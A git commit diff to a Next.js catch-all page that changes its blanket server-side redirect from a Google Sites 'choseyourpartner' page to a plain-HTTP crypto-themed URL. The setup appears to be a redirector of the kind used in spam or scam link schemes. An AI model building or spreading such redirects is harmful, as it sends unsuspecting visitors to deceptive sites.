20e5fcf27b1820461d43ab871af92556b5385206
danishrahim2 <134365380+danishrahim2@users.noreply.github.com>
2023-05-24 15:19:36 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://sites.google.com/view/choseyourpartner/home/`
+					`http://cryptoinfo.ulti.eu.org/home-less/`
 				}`,
 			},
 		};
